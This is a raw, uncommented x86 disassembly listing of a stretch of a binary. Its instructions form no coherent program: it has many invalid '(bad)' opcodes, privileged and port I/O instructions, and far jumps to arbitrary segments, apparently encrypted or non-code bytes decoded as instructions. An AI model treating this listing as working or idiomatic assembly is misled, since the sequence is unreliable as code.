  407b1a:	jle    0x407b7e
  407b1c:	push   ds
  407b1d:	mov    ebp,eax
  407b1f:	sub    BYTE PTR [edx+esi*2],0x63
  407b23:	push   0xffffff9b
  407b25:	sbb    eax,0xb8c95133
  407b2a:	xor    BYTE PTR [esi-0x1c08e0e0],bh
  407b30:	mov    al,0x44
  407b32:	lds    edi,FWORD PTR [edx+0x306526a7]
  407b38:	push   ebp
  407b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b3a:	jecxz  0x407b2b
  407b3c:	push   ecx
  407b3d:	cld    
  407b3e:	adc    BYTE PTR [ecx],dl
  407b40:	inc    esi
  407b41:	push   ecx
  407b42:	adc    esi,DWORD PTR [edi+0x76f8f1db]
  407b48:	cmp    BYTE PTR [esi-0x1fd1661f],dh
  407b4e:	xchg   ebp,eax
  407b4f:	or     al,BYTE PTR [edx-0x36]
  407b52:	xor    BYTE PTR [edx+0x5f129cd1],al
  407b58:	xor    ah,ah
  407b5a:	or     DWORD PTR [esi+0x67db1e10],edi
  407b60:	ins    DWORD PTR es:[edi],dx
  407b61:	jae    0x407bcb
  407b63:	mov    ah,0x1e
  407b65:	adc    DWORD PTR ds:[esi+0x5e403d8e],ebx
  407b6c:	dec    esi
  407b6d:	aas    
  407b6e:	or     eax,0x50ffaf93
  407b73:	into   
  407b74:	icebp  
  407b75:	pop    eax
  407b76:	add    al,0x71
  407b78:	sbb    ch,BYTE PTR [edx+0x594a6454]
  407b7e:	fwait
  407b7f:	pop    ebp
  407b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b81:	or     ebx,DWORD PTR [edx]
  407b83:	xchg   ebx,eax
  407b84:	stos   DWORD PTR es:[edi],eax
  407b85:	push   es
  407b86:	push   esi
  407b87:	pushf  
  407b88:	leave  
  407b89:	sub    cl,ah
  407b8b:	lods   eax,DWORD PTR ds:[esi]
  407b8c:	test   eax,0x9b36d1de
  407b91:	add    edx,DWORD PTR [edx]
  407b93:	jmp    0x407c07
  407b95:	mov    ds:0xe5e230f7,al
  407b9a:	mov    ebp,ss
  407b9c:	dec    esp
  407b9d:	or     DWORD PTR [eax+0x5f549229],0xf789c80a
  407ba7:	fdivp  st(0),st
  407ba9:	and    DWORD PTR [ebp+ebp*2+0x65],0x3940cab3
  407bb1:	jmp    0xe066:0xe0ea3c77
  407bb8:	add    dh,ah
  407bba:	jg     0x407c33
  407bbc:	jno    0x407bba
  407bbe:	addr16 pop ss
  407bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc1:	out    0xd3,eax
  407bc3:	cwde   
  407bc4:	int    0x28
  407bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bc7:	cmp    BYTE PTR [esi+esi*1-0x5537b4ba],dh
  407bce:	call   esp
  407bd0:	addr16 xchg edi,eax
  407bd2:	fs mov dh,0x52
  407bd5:	fsubr  QWORD PTR [eax]
  407bd7:	fidiv  DWORD PTR [ecx+ebp*4]
  407bda:	xchg   ecx,eax
  407bdb:	sub    BYTE PTR [ebx+0x3e842fe9],dh
  407be1:	jp     0x407c18
  407be3:	imul   edi,DWORD PTR [esi+0x2bed351a],0xb832a838
  407bed:	cmp    DWORD PTR [ebx],edx
  407bef:	mov    dl,0x3a
  407bf1:	cmp    bl,BYTE PTR [esi-0x6e]
  407bf4:	test   DWORD PTR [ebp-0x14],edi
  407bf7:	and    al,0xc0
  407bf9:	loop   0x407bc3
  407bfb:	dec    ebp
  407bfc:	cs mov ebx,0x881d17d7
  407c02:	fist   DWORD PTR [ebx-0x58]
  407c05:	in     al,0xfe
  407c07:	sbb    esi,DWORD PTR [ebx+0x5b8f74fc]
  407c0d:	add    BYTE PTR cs:[ebp+0x471c5a14],0xa5
  407c15:	jnp    0x407c78
  407c17:	push   0xffffff9f
  407c19:	pop    ds
  407c1a:	xchg   esi,ecx
  407c1c:	xor    esp,DWORD PTR [eax-0xc74c4d6]
  407c22:	fistp  WORD PTR cs:[eax+0x7e]
  407c26:	sub    DWORD PTR [edi+0xd170e1],0xffffffe8
  407c2d:	inc    edi
  407c2e:	mov    dh,0x50
  407c30:	jnp    0x407c2d
  407c32:	out    dx,eax
  407c33:	fadd   QWORD PTR [ebp+0x2a496ddf]
  407c39:	scas   al,BYTE PTR es:[edi]
  407c3a:	jb     0x407c68
  407c3c:	ds jno 0x407bf9
  407c3f:	sbb    ah,BYTE PTR [ebp+esi*8+0x18175e01]
  407c46:	sbb    eax,0x96a94ec6
  407c4b:	xor    eax,0x60a7d663
  407c50:	sub    eax,0xc3a27c17
  407c55:	jg     0x407bec
  407c57:	les    ebx,FWORD PTR ss:[eax-0x312a5cdd]
  407c5e:	stos   BYTE PTR es:[edi],al
  407c5f:	add    eax,0xefa82b14
  407c64:	scas   al,BYTE PTR es:[edi]
  407c65:	mov    esi,0x82a3ba7c
  407c6a:	jbe    0x407cd1
  407c6c:	add    ebp,0x39dbd9fc
  407c72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c73:	inc    dx
  407c75:	mov    ds:0xdb9ef9ba,al
  407c7a:	test   BYTE PTR [ebx-0x4f],bl
  407c7d:	gs jo  0x407c7e
  407c80:	xor    DWORD PTR [ebx-0x4a3e0a62],edx
  407c86:	in     al,0x4
  407c88:	sbb    DWORD PTR [si+0x78],ebx
  407c8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8d:	or     edi,esp
  407c8f:	je     0x407cba
  407c91:	xchg   BYTE PTR [esi-0x28b6b0a],bl
  407c97:	and    DWORD PTR [edi],ebp
  407c99:	imul   esi,ecx,0xffffff88
  407c9c:	bnd ja 0x407d0c
  407c9f:	jns    0x407d04
  407ca1:	cmp    BYTE PTR [si+0x3b],ah
  407ca5:	pop    ss
  407ca6:	dec    ebx
  407ca7:	jge    0x407d25
  407ca9:	pusha  
  407caa:	call   0x89dc902e
  407caf:	imul   esi,DWORD PTR [ecx+edx*2],0xbb38a913
  407cb6:	shr    DWORD PTR [edx+0x4],1
  407cb9:	dec    eax
  407cba:	cmp    eax,0xf80c558a
  407cbf:	mov    ebp,0xe804555c
  407cc4:	outs   dx,BYTE PTR ds:[esi]
  407cc5:	mul    DWORD PTR [edi+0x1e879bd4]
  407ccb:	add    BYTE PTR [ebp-0x7e2ca3b7],dh
  407cd1:	mov    DWORD PTR [eax+0x2aa8baaa],eax
  407cd7:	scas   eax,DWORD PTR es:[edi]
  407cd8:	pop    ss
  407cd9:	xor    eax,0xf33c6bd1
  407cde:	xchg   esp,esp
  407ce0:	hlt    
  407ce1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ce2:	adc    edx,DWORD PTR [edx]
  407ce4:	clc    
  407ce5:	push   edx
  407ce6:	fistp  WORD PTR [eax-0x550ad209]
  407cec:	sub    al,dl
  407cee:	inc    ebx
  407cef:	fiadd  WORD PTR [edx-0x10a7c9e0]
  407cf5:	xchg   ebp,eax
  407cf6:	dec    ebp
  407cf7:	fwait
  407cf8:	out    0x1c,eax
  407cfa:	scas   eax,DWORD PTR es:[edi]
  407cfb:	mov    bl,0x2
  407cfd:	test   eax,0xc90ebad7
  407d02:	adc    DWORD PTR [ebx-0x74],ebp
  407d05:	add    al,0xb0
  407d07:	push   ss
  407d08:	mov    ds:0xbbb13146,eax
  407d0d:	cmc    
  407d0e:	sbb    esi,edx
  407d10:	push   ss
  407d11:	retf   0x522a
  407d14:	mov    eax,ds:0xbf66e994
  407d19:	retf   0xf326
  407d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d1d:	jb     0x407d26
  407d1f:	rol    DWORD PTR [ecx+0x3c],cl
  407d22:	retf   0x3e
  407d25:	mov    edx,0x18526879
  407d2a:	aaa    
  407d2b:	push   0x53002342
  407d30:	mov    eax,ds:0x95c9f97d
  407d35:	inc    ecx
  407d36:	pusha  
  407d37:	sub    BYTE PTR [edx],al
  407d39:	cmp    ch,BYTE PTR [edi]
  407d3b:	inc    BYTE PTR [ecx+0x79b1ec0]
  407d41:	sbb    bh,BYTE PTR [eax]
  407d43:	sahf   
  407d44:	daa    
  407d45:	xchg   BYTE PTR [esi],ah
  407d47:	pop    esi
  407d48:	xchg   edx,eax
  407d49:	call   0x1b41:0x2695be3
  407d50:	xchg   esi,eax
  407d51:	mov    bh,0xa2
  407d53:	and    BYTE PTR [edx+0x7d],cl
  407d56:	xchg   ebx,eax
  407d57:	inc    esi
  407d58:	jnp    0x407db7
  407d5a:	repnz mov ss,ebx
  407d5d:	mov    ch,0xf1
  407d5f:	xchg   edx,eax
  407d60:	push   0xeccad3dc
  407d65:	jmp    0x67ea:0xb99af85b
  407d6c:	cli    
  407d6d:	test   BYTE PTR [ebp-0x6579323c],dl
  407d73:	cmp    DWORD PTR [eax-0x10b35a7a],edi
  407d79:	int    0x1f
  407d7b:	in     eax,0x85
  407d7d:	push   esp
  407d7e:	cli    
  407d7f:	and    ch,ah
  407d81:	and    al,0xbf
  407d83:	fnstenv [eax]
  407d85:	aam    0xf5
  407d87:	inc    esp
  407d88:	mov    bh,0xb7
  407d8a:	(bad)  
  407d8b:	fild   WORD PTR [esp+ebx*4+0x54704680]
  407d92:	iret   
  407d93:	xchg   BYTE PTR [ebx+0x54],bh
  407d96:	(bad)  
  407d97:	(bad)  
  407d98:	icebp  
  407d99:	sbb    DWORD PTR [ecx-0x59],0x28
  407d9d:	(bad)
  407da0:	pop    edi
  407da1:	mov    BYTE PTR [esi+0x13a318a3],bl
  407da7:	les    edx,FWORD PTR [eax+0x11fa5191]
  407dad:	jle    0x407da9
  407daf:	sub    BYTE PTR ds:0x13c70561,dh
  407db5:	jno    0x407d52
  407db7:	xchg   BYTE PTR [ecx-0x645278f7],dl
  407dbd:	xchg   esi,eax
  407dbe:	adc    dh,cl
  407dc0:	js     0x407d9b
  407dc2:	sub    dl,BYTE PTR ds:[ecx+edi*2-0x77]
  407dc7:	and    esi,DWORD PTR [ebp+0x3e]
  407dca:	cmp    ecx,DWORD PTR [ebx]
  407dcc:	lods   eax,DWORD PTR ds:[esi]
  407dcd:	in     eax,dx
  407dce:	mov    esp,0x87e4f619
  407dd3:	fimul  WORD PTR [ecx+0x5b0b1660]
  407dd9:	dec    ecx
  407dda:	cmc    
  407ddb:	in     eax,0xf6
  407ddd:	scas   eax,DWORD PTR es:[edi]
  407dde:	and    bl,0x42
  407de1:	mov    cs,WORD PTR [ecx-0x13]
  407de4:	sbb    eax,0x987f2e46
  407de9:	cmp    eax,0xf3f210ee
  407dee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407def:	std    
  407df0:	push   esp
  407df1:	(bad)  
  407df2:	fild   DWORD PTR [edx-0x12]
  407df5:	test   DWORD PTR [eax-0x3f384771],esi
  407dfb:	scas   eax,DWORD PTR es:[edi]
  407dfc:	ret    0x39ec
  407dff:	mov    al,0x3d
  407e01:	imul   BYTE PTR [eax-0x72]
  407e04:	test   DWORD PTR [ecx+ebp*8],esi
  407e07:	sti    
  407e08:	mov    bh,0x7e
  407e0a:	js     0x407dee
  407e0c:	sub    ecx,DWORD PTR [edi+0x68]
  407e0f:	pop    ss
  407e10:	in     al,dx
  407e11:	cmp    eax,0x920f2685
  407e16:	mov    dh,0x5e
  407e18:	shl    edi,cl
  407e1a:	dec    edi
  407e1b:	mov    WORD PTR [edx-0x43],ds
  407e1e:	add    eax,ecx
  407e20:	fwait
  407e21:	out    0x19,eax
  407e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e24:	cmp    dh,BYTE PTR [edx]
  407e26:	add    al,0xfd
  407e28:	fsubr  DWORD PTR [ebp-0x1a8806a6]
  407e2e:	xor    eax,0xf7f5cc1c
  407e33:	cmp    edx,DWORD PTR [edi+0x4]
  407e36:	inc    ebp
  407e37:	dec    ebx
  407e38:	dec    eax
  407e39:	add    eax,0xadbcbccf
  407e3e:	jmp    0x7b36:0x407377d9
  407e45:	in     eax,dx
  407e46:	mov    esp,0xdad20478
  407e4b:	adc    eax,0x8b43393b
  407e50:	jne    0x407e9a
  407e52:	cwde   
  407e53:	in     eax,0xcf
  407e55:	pop    ebp
  407e56:	in     eax,dx
  407e57:	jecxz  0x407e92
  407e59:	add    ecx,DWORD PTR [edi+0x60]
  407e5c:	lds    esp,FWORD PTR [edi]
  407e5e:	retf   0x720d
  407e61:	add    cl,dl
  407e63:	sbb    al,BYTE PTR [eax*1+0x634e96cf]
  407e6a:	pusha  
  407e6b:	int3   
  407e6c:	jne    0x407e3f
  407e6e:	adc    eax,0x505a1a3d
  407e73:	test   eax,0x5505a5ce
  407e78:	mov    eax,0xc0672200
  407e7d:	ror    DWORD PTR [edx],0x4d
  407e80:	cli    
  407e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e82:	adc    al,0x67
  407e84:	mov    edi,0xae24def2
  407e89:	xor    esi,DWORD PTR [eax+0x1e]
  407e8c:	mov    al,0x51
  407e8e:	loop   0x407e5e
  407e90:	sub    esi,DWORD PTR [esi+0x4b]
  407e93:	xchg   esp,eax
  407e94:	rsqrtps xmm3,XMMWORD PTR [ecx-0x2a]
  407e98:	and    bh,bl
  407e9a:	clc    
  407e9b:	pop    esp
  407e9c:	fldcw  WORD PTR ds:0x45d8641f
  407ea2:	fs push cs
  407ea4:	push   esp
  407ea5:	add    eax,0xd19153a
  407eaa:	xchg   esi,eax
  407eab:	pusha  
  407eac:	in     al,dx
  407ead:	cwde   
  407eae:	inc    esp
  407eaf:	xor    edx,DWORD PTR [esp+ecx*2]
  407eb2:	jnp    0x407f29
  407eb4:	pushf  
  407eb5:	call   0xa4e019b5
  407eba:	sub    edi,DWORD PTR [ebx]
  407ebc:	pop    ss
  407ebd:	out    0x4b,eax
  407ebf:	ds cmp eax,0x87c1d325
  407ec5:	dec    ebp
  407ec6:	mov    dh,0x76
  407ec8:	xchg   edi,eax
  407ec9:	dec    ebp
  407eca:	retf   
  407ecb:	bound  edi,QWORD PTR [ebx]
  407ecd:	es nop
  407ecf:	std    
  407ed0:	and    edx,DWORD PTR [ecx]
  407ed2:	lea    esi,[ebx+0x7]
  407ed5:	iret   
  407ed6:	and    al,0x6f
  407ed8:	pop    ss
  407ed9:	out    0xbb,al
  407edb:	rol    BYTE PTR [ecx+0x1a],1
  407ede:	xchg   edi,eax
  407edf:	pop    esp
  407ee0:	jbe    0x407ef8
  407ee2:	lock push edi
  407ee4:	pop    ebp
  407ee5:	jb     0x407eb6
  407ee7:	int3   
  407ee8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee9:	sub    eax,0xf14787dc
  407eee:	dec    esp
  407eef:	imul   DWORD PTR [ebx-0x55]
  407ef2:	jp     0x407ef0
  407ef4:	adc    eax,0x37eda552
  407ef9:	sar    eax,1
  407efb:	mov    ds:0xab01de05,eax
  407f00:	jne    0x407ed2
  407f02:	jo     0x407f37
  407f04:	in     eax,0x94
  407f06:	inc    ebp
  407f07:	out    dx,eax
  407f08:	(bad)  
  407f09:	jno    0x407f2c
  407f0b:	push   esi
  407f0c:	and    cl,BYTE PTR [ecx]
  407f0e:	sti    
  407f0f:	ins    DWORD PTR es:[edi],dx
  407f10:	and    al,BYTE PTR [ecx+0xf051aea]
  407f16:	cld    
  407f17:	cmp    al,0xbb
  407f19:	adc    al,0xe5
  407f1b:	test   BYTE PTR [eax-0x56],0x82
  407f1f:	xlat   BYTE PTR es:[ebx]
  407f21:	add    DWORD PTR [edi],ecx
  407f23:	jle    0x407f3e
  407f25:	(bad)  
  407f27:	and    BYTE PTR [ecx-0x24],cl
  407f2a:	imul   ecx,DWORD PTR [edx-0x10],0x69
  407f2e:	jb     0x407f05
  407f30:	rcl    BYTE PTR [ebx],1
  407f32:	pop    eax
  407f33:	push   0xdb107524
  407f38:	adc    eax,0xd70655d9
  407f3d:	out    0xa4,eax
  407f3f:	imul   esp,DWORD PTR [esi],0xffffffe8
  407f42:	stc    
  407f43:	jp     0x407faf
  407f45:	xchg   edi,eax
  407f46:	in     eax,dx
  407f47:	jg     0x407ed5
  407f49:	test   DWORD PTR [eax-0x68],edx
  407f4c:	daa    
  407f4d:	in     al,dx
  407f4e:	dec    eax
  407f4f:	cdq    
  407f50:	sbb    edx,DWORD PTR [esi+0x7d]
  407f53:	out    0xdf,al
  407f55:	call   DWORD PTR [ebx+0x56cd07fb]
  407f5b:	mov    al,ds:0xdd264c71
  407f60:	in     al,dx
  407f61:	fmul   QWORD PTR [edi-0x47]
  407f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f65:	(bad)  [ecx+0x1eb66a6f]
  407f6b:	hlt    
  407f6c:	pop    ecx
  407f6d:	int    0xa7
  407f6f:	addr16 in eax,dx
  407f71:	xchg   ebp,eax
  407f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f73:	punpcklbw mm1,DWORD PTR [edx]
  407f76:	outs   dx,BYTE PTR ds:[esi]
  407f77:	mov    ch,0x39
  407f79:	(bad)  
  407f7a:	mov    ah,0x39
  407f7c:	bswap  esp
  407f7e:	push   esp
  407f7f:	cmp    BYTE PTR [ecx+0x6a7143],dl
  407f85:	sbb    bh,bl
  407f87:	dec    esi
  407f88:	mov    edx,0x8b55476e
  407f8d:	xchg   edi,eax
  407f8e:	adc    eax,0x157f16bc
  407f93:	repz mov dh,0x8b
  407f96:	retf   0x8b80
  407f99:	sub    BYTE PTR [ecx+0x31],ah
  407f9c:	xchg   ebp,eax
  407f9d:	adc    eax,0xe841f569
  407fa2:	repz jnp 0x407faa
  407fa5:	cmp    BYTE PTR [eax+0x5d91a434],cl
  407fab:	jle    0x407fc6
  407fad:	sub    ebp,eax
  407faf:	jg     0x407ff1
  407fb1:	mov    DWORD PTR [esi-0x540042e0],ecx
  407fb7:	nop
  407fb8:	mov    bl,0xb8
  407fba:	jmp    0x31ce:0xa7d4afc
  407fc1:	stc    
  407fc2:	jl     0x407f97
  407fc4:	sub    al,0xe4
  407fc6:	retf   
  407fc7:	int    0x2d
  407fc9:	mov    al,ds:0x2e1d3d34
  407fce:	jl     0x407fae
  407fd0:	ficom  WORD PTR [esi]
  407fd2:	jns    0x40801d
  407fd4:	sub    edx,ebp
  407fd6:	test   ebx,edi
  407fd8:	lea    edi,[ebp+0x18300b5c]
  407fde:	(bad)  
  407fdf:	xor    al,0xab
  407fe1:	sub    al,0x65
  407fe3:	add    edx,DWORD PTR [ebx-0x4c03be9b]
  407fe9:	test   al,0xa1
  407feb:	mov    eax,0xce17f973
  407ff0:	xor    ch,bh
  407ff2:	mov    gs,WORD PTR [eax-0x52]
  407ff5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ff6:	loope  0x407f90
  407ff8:	and    ebx,DWORD PTR [ecx]
  407ffa:	dec    edx
  407ffb:	aam    0xd5
  407ffd:	mul    BYTE PTR [edx-0x2b3aed32]
  408003:	mov    dl,0x3f
  408005:	xor    eax,0xc98b6b37
  40800a:	cmp    al,0x3
  40800c:	dec    ecx
  40800d:	jmp    0x407fd0
  40800f:	dec    eax
  408010:	mov    ecx,0xf1ad322d
  408015:	stos   DWORD PTR es:[edi],eax
  408016:	inc    ebx
  408017:	mov    al,0xdc
  408019:	iret   
  40801a:	mov    esp,0x33101d00
  40801f:	push   edx
  408020:	fisubr WORD PTR [ebp+0x17dcce29]
  408026:	pushf  
  408027:	pop    esp
  408028:	sbb    eax,0x4e
  40802b:	sub    DWORD PTR [ebx],esi
  40802d:	or     BYTE PTR [ebp-0x4672dc87],ah
  408033:	jb     0x407fed
  408035:	mov    edx,DWORD PTR [ecx+0x6]
  408038:	mov    al,ds:0xffd19d9b
  40803d:	jno    0x407fc9
  40803f:	mov    cl,0xc0
  408041:	lods   eax,DWORD PTR ds:[esi]
  408042:	jmp    0x407fe5
  408044:	test   eax,0x8e49e9a3
  408049:	pop    ebx
  40804a:	xor    al,0xf8
  40804c:	push   0xffffff89
  40804e:	ins    DWORD PTR es:[edi],dx
  40804f:	fs scas eax,DWORD PTR es:[edi]
  408051:	jmp    0xf6c254f
  408056:	cmc    
  408057:	test   BYTE PTR [ebp-0x9a383ca],ah
  40805d:	jne    0x40808c
  40805f:	push   ss
  408060:	sub    eax,0x3bc43df5
  408065:	xor    eax,DWORD PTR [esi+0x2bfcd366]
  40806b:	std    
  40806c:	aad    0xc4
  40806e:	bound  esi,QWORD PTR [ebx+edx*1]
  408071:	(bad)  
  408072:	mov    bl,0x51
  408074:	popf   
  408075:	sbb    DWORD PTR [eax+eax*4],0x73
  408079:	mov    bh,0x84
  40807b:	pop    ecx
  40807c:	fs add eax,0x3dd290ef
  408082:	leave  
  408083:	mov    eax,ds:0xdebbbf5d
  408088:	fsubr  st,st(4)
  40808a:	sbb    dl,BYTE PTR [ebx+0x68d1a319]
  408090:	outs   dx,DWORD PTR ds:[esi]
  408091:	enter  0x25d7,0x1a
  408095:	stc    
  408096:	sti    
  408097:	xchg   ebx,eax
  408098:	sahf   
  408099:	xchg   ebp,eax
  40809a:	inc    ecx
  40809b:	rcl    DWORD PTR [esi+0x22917555],0xe3
  4080a2:	cwde   
  4080a3:	xchg   edx,eax
  4080a4:	call   0x2dbe17a2
  4080a9:	cmp    ecx,DWORD PTR [bx+0x5aea]
  4080ae:	outs   dx,DWORD PTR ds:[esi]
  4080af:	mov    ecx,0x7d439c79
  4080b4:	adc    esi,DWORD PTR [bx+si-0x3f]
  4080b8:	xchg   BYTE PTR [ecx],bh
  4080ba:	add    BYTE PTR [ebx+ecx*1+0x5f5543e1],dh
  4080c1:	dec    esi
  4080c2:	stos   DWORD PTR es:[edi],eax
  4080c3:	push   ebp
  4080c4:	dec    esi
  4080c5:	mov    eax,0x2da3fedc
  4080ca:	(bad)  
  4080cc:	ret    
  4080cd:	or     DWORD PTR [eax+ecx*4-0x7a251cd4],0x7c
  4080d5:	adc    al,BYTE PTR [edx+0x5b]
  4080d8:	mov    dh,0xf9
  4080da:	(bad)  
  4080db:	jbe    0x4080d1
  4080dd:	jge    0x40810d
  4080df:	outs   dx,DWORD PTR ds:[esi]
  4080e0:	add    bl,BYTE PTR [edx-0x9]
  4080e3:	fidivr WORD PTR [edi]
  4080e5:	out    0x69,eax
  4080e7:	inc    cl
  4080e9:	test   dl,dh
  4080eb:	adc    DWORD PTR [ecx+edi*2+0x21ede8c9],eax
  4080f2:	sar    dh,1
  4080f4:	cs daa 
  4080f6:	cmp    dl,bl
  4080f8:	dec    edx
  4080f9:	ss dec esi
  4080fb:	push   eax
  4080fc:	lea    eax,[esi-0x18]
  4080ff:	and    al,0x89
  408101:	push   ebx
  408102:	and    dl,BYTE PTR ds:0xf71966a3
  408108:	repz sbb eax,0x80667996
  40810e:	pop    edi
  40810f:	ins    BYTE PTR es:[edi],dx
  408110:	xor    ecx,edx
  408112:	and    DWORD PTR ds:0x460e3928,edi
  408118:	add    al,0xda
  40811a:	(bad)  
  40811b:	fist   WORD PTR [edi]
  40811d:	inc    esi
  40811e:	(bad)  
  40811f:	xchg   esp,eax
  408120:	xchg   esi,eax
  408121:	push   edx
  408122:	jae    0x4080f9
  408124:	adc    BYTE PTR [eax+edi*8],dl
  408127:	jp     0x408186
  408129:	outs   dx,BYTE PTR ds:[esi]
  40812a:	ret    
  40812b:	rcr    ebx,cl
  40812d:	sub    al,dl
  40812f:	rcr    DWORD PTR [edi+0x292505f3],0x60
  408136:	js     0x4080d3
  408138:	(bad)  
  408139:	cli    
  40813a:	push   ecx
  40813b:	push   ebp
  40813c:	push   edi
  40813d:	call   0xf70f:0x4b8a2b80
  408144:	xor    DWORD PTR [edi],ebp
  408146:	(bad)  
  408147:	in     eax,dx
  408148:	loopne 0x408191
  40814a:	xor    edi,esp
  40814c:	dec    ebx
  40814d:	ret    
  40814e:	jl     0x4081bb
  408150:	and    bl,BYTE PTR [edi]
  408152:	xor    ebp,edx
  408154:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408155:	mov    edx,0x73266902
  40815a:	es push 0xffffff9d
  40815d:	hlt    
  40815e:	mov    edi,esp
  408160:	sub    al,0x39
  408162:	xchg   edi,eax
  408163:	inc    ebp
  408164:	push   esp
  408165:	pop    eax
  408166:	pop    edi
  408167:	adc    ecx,esi
  408169:	cmp    eax,0x2de5dfc0
  40816e:	or     DWORD PTR [edx+0x5],ebx
  408171:	(bad)  
  408172:	sbb    esp,DWORD PTR [esi+0x6]
  408175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408176:	(bad)  [eax]
  408178:	push   ss
  408179:	js     0x40813c
  40817b:	mov    ds,WORD PTR [esi+0xb]
  40817e:	out    0xb5,eax
  408180:	xchg   ecx,eax
  408181:	jg     0x408143
  408183:	lods   eax,DWORD PTR ds:[esi]
  408184:	imul   edx,DWORD PTR [ecx],0x4d
  408187:	sbb    dl,bh
  408189:	(bad)  
  40818b:	pop    esi
  40818c:	pop    edi
  40818d:	pop    ds
  40818e:	jecxz  0x40820a
  408190:	fbld   TBYTE PTR [esi]
  408192:	loop   0x4081ca
  408194:	ret    0x7d5f
  408197:	(bad)  
  408198:	arpl   WORD PTR [ecx],sp
  40819a:	push   ebx
  40819b:	fstp   DWORD PTR [ecx-0x49]
  40819e:	mov    edi,0x988994c2
  4081a3:	fstp   QWORD PTR [ebx+0x43]
  4081a6:	jno    0x4081ba
  4081a8:	mov    ebx,0xddbd9a54
  4081ad:	int3   
  4081ae:	jo     0x408168
  4081b0:	sub    ebp,DWORD PTR [esp+edx*4-0x2474d60e]
  4081b7:	mov    ?,esi
  4081b9:	xchg   BYTE PTR [eax+0x54],dl
  4081bc:	cli    
  4081bd:	push   0xaa72437c
  4081c2:	cli    
  4081c3:	xor    ah,dh
  4081c5:	loop   0x4081f8
  4081c7:	icebp  
  4081c8:	jecxz  0x408228
  4081ca:	inc    ebx
  4081cb:	retf   
  4081cc:	sub    ch,BYTE PTR [ebp+0x26]
  4081cf:	(bad)  
  4081d0:	jmp    0xb84d:0x304966aa
  4081d7:	cmp    esp,DWORD PTR [ebp-0x4771dc0f]
  4081dd:	sub    DWORD PTR [eax+0x47b102a7],esi
  4081e3:	in     eax,0x29
  4081e5:	cld    
  4081e6:	xor    al,0xfe
  4081e8:	or     al,0x4b
  4081ea:	mov    bh,0x93
  4081ec:	ins    BYTE PTR es:[edi],dx
  4081ed:	stos   BYTE PTR es:[edi],al
  4081ee:	jl     0x408207
  4081f0:	out    dx,al
  4081f1:	mov    ebp,0xcf61cd7a
  4081f6:	cdq    
  4081f7:	js     0x408205
  4081f9:	loope  0x4081b9
  4081fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081fc:	adc    DWORD PTR [edx-0x57],0x4a0b1994
  408203:	mov    dh,0x3c
  408205:	repnz cmp DWORD PTR [ecx-0x34],esi
  408209:	in     al,dx
  40820a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40820b:	out    0xc7,al
  40820d:	ret    
  40820e:	sub    BYTE PTR [edx],ch
  408210:	cld    
  408211:	sti    
  408212:	inc    ebx
  408213:	dec    edx
  408214:	in     eax,0x2a
  408216:	outs   dx,DWORD PTR ds:[esi]
  408217:	pop    edx
  408218:	cmp    esi,DWORD PTR [edi]
  40821a:	pop    ebx
  40821b:	xchg   DWORD PTR [ebx+ebx*2+0x3d],eax
  40821f:	test   al,0x6d
  408221:	jae    0x4081a5
  408223:	ret    0x30a1
  408226:	pop    eax
  408227:	push   edi
  408228:	mov    edi,0x64dd637e
  40822d:	and    bl,BYTE PTR ds:0x46ae7468
  408233:	xor    al,0x38
  408235:	mov    edi,0x1ed46646
  40823a:	imul   eax,ebp,0x4e75bd53
  408240:	cld    
  408241:	(bad)  
  408243:	iret   
  408244:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408245:	in     al,0xe7
  408247:	sbb    esp,DWORD PTR [ecx+0x68]
  40824a:	retf   
  40824b:	jbe    0x40823a
  40824d:	sub    bl,BYTE PTR [esi-0x44]
  408250:	push   ebx
  408251:	aad    0xef
  408253:	or     eax,eax
  408255:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408256:	xchg   ebp,eax
  408257:	push   cs
  408258:	jmp    0x40829e
  40825a:	mov    esi,0x2119bdd4
  40825f:	gs push ss
  408261:	imul   edi,DWORD PTR [edx-0x502d35df],0x393efc61
  40826b:	test   al,0x4c
  40826d:	xchg   ecx,esp
  40826f:	rcr    DWORD PTR [esi],1
  408271:	jno    0x4082eb
  408273:	retf   
  408274:	and    ebp,DWORD PTR [esp+ebx*4]
  408277:	sahf   
  408278:	inc    esp
  408279:	(bad)  
  40827a:	test   DWORD PTR [edx],0xa8626a2c
  408280:	mov    bl,0x6
  408282:	dec    edi
  408283:	test   DWORD PTR [eax-0x55882182],eax
  408289:	ret    0x29e5
  40828c:	sbb    BYTE PTR [esp+eax*1+0x1be07199],cl
  408293:	adc    BYTE PTR es:[eax],bh
  408296:	call   0x281e1b0f
  40829b:	push   esp
  40829c:	out    0x65,eax
  40829e:	daa    
  40829f:	sub    al,0x56
  4082a1:	repnz test al,0xab
  4082a4:	fxch   st(7)
  4082a6:	jne    0x4082dc
  4082a8:	push   0xe90a1e2d
  4082ad:	inc    esi
  4082ae:	jae    0x408289
  4082b0:	jp     0x40832b
  4082b2:	dec    ebx
  4082b3:	jns    0x40828f
  4082b5:	dec    edx
  4082b6:	mov    esi,0x2f6d3a4c
  4082bb:	push   edi
  4082bc:	and    al,BYTE PTR [ebx+eiz*4+0x7b]
  4082c0:	retf   
  4082c1:	mov    ds:0x9a7e5aeb,al
  4082c6:	jnp    0x408282
  4082c8:	cs int 0xe3
  4082cb:	fstp   DWORD PTR [ebp+0x6b]
  4082ce:	and    edx,esi
